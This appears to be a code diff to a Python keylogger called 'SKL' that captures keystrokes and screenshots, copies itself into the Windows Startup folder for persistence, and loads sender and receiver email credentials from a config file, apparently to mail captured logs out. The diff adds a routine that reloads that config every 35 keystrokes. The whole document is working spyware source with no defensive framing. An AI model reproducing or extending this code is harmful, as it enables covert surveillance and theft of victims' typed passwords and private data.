@@ -22,20 +22,15 @@ import pyautogui
 keys = []
 screenshot_number = 0
 
+const_senderEmail = str
+const_senderPassword = str
+const_receiverEmail = str
+const_mode = str
+const_screenshot = bool
 
-#!# -----------------------------------STARTUP----------------------------------- #!#
-
-
-USER_NAME = getpass.getuser()
-Src = (sys.argv[0])
-Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
-try:
-    shutil.move(Src, Dest)
-except:
-    pass        
+const_check_amt = 35
 
 #&# -----------------------------------JSON-FILES----------------------------------- #&#
-
 
 USER = os.getlogin()
 directory = "SKL"
@@ -55,6 +50,43 @@ except:
              json.dump(new,r)
 
 JsonPath = f"{path}/config.json"
+
+#@# -----------------------------------CONFIG SAVER----------------------------------- #@#
+
+def checkConfig():
+    global const_senderEmail
+    global const_senderPassword
+    global const_receiverEmail 
+    global const_mode 
+    global const_screenshot 
+    
+    print(const_senderEmail)
+    
+        
+    try:
+        with open(f"{JsonPath}", "r") as Config:
+                parsed = json.load(Config)
+                const_senderEmail = parsed["sender_email"]
+                const_senderPassword = parsed["sender_password"]
+                const_receiverEmail = parsed["receiver_email"]
+                const_mode = parsed["mode"]
+                const_screenshot = parsed["screenshot"]
+    except:
+        with open(f"{JsonPath}", "w") as F:
+            new_config = {"sender_email": const_senderEmail,"sender_password": const_senderPassword, "receiver_email":const_receiverEmail, "mode": const_mode, "screenshot": const_screenshot}
+            json.dump(new_config,F)
+
+#!# -----------------------------------STARTUP----------------------------------- #!#
+
+
+USER_NAME = getpass.getuser()
+Src = (sys.argv[0])
+Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
+try:
+    shutil.move(Src, Dest)
+except:
+    pass        
+
 
 #?# -----------------------------------EMAILS----------------------------------- #?#
 
@@ -123,6 +155,7 @@ def CapsStatus():
 
 def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):                     
   
+    checkConfig()
 
     with open(f"{JsonPath}","r") as file:
         parsed = json.load(file)
@@ -139,6 +172,7 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):
     def on_press(key):
         
         global keys
+        global const_check_amt
         sendBool = False
         if key == Key.space:
             key = " "
@@ -157,6 +191,12 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):
         
         
         if CapsStatus(): key = str(key); key = key.upper()  
+        
+        const_check_amt -= 1
+    
+        if const_check_amt == 0:
+            checkConfig()
+            const_check_amt = 35
         
 
 
@@ -265,5 +305,3 @@ with open(f"inject.json", "r") as Inject:
                     json.dump(configData,Config)   
 os.remove("inject.json")            
 START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)
-
-
